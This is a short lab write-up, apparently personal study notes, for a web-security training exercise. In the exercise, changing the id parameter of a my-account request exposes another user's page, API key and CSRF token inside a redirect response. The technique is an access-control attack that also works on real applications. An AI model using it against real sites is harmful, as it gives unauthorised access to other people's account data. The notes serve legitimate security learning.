# User ID controlled by request parameter with data leakage in redirect

[Lab in PortSwigger](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)

## Definition
n some cases, an application does detect when the user is not permitted to access the resource, and returns a redirect to the login page. However, the response containing the redirect might still include some sensitive data belonging to the targeted user, so the attack is still successful.

## Notes
Request to acess `my-account` page:
```http
GET /my-account?id=<username>
```

Trying to acess `my-account` page from another user, the original page is leaked before the redirection.
```html
<h1>My Account</h1>
<div id=account-content>
    <p>Your username is: carlos</p>
    <div>Your API Key is: eItXXhaESlkYNMTPs5yhlPdcFgMgALs3</div><br/>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="eY5Ov92vyGlAt3W2NeWb13RxL8oI7K1Q">
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
```

## Key Words
> id, user, data, leak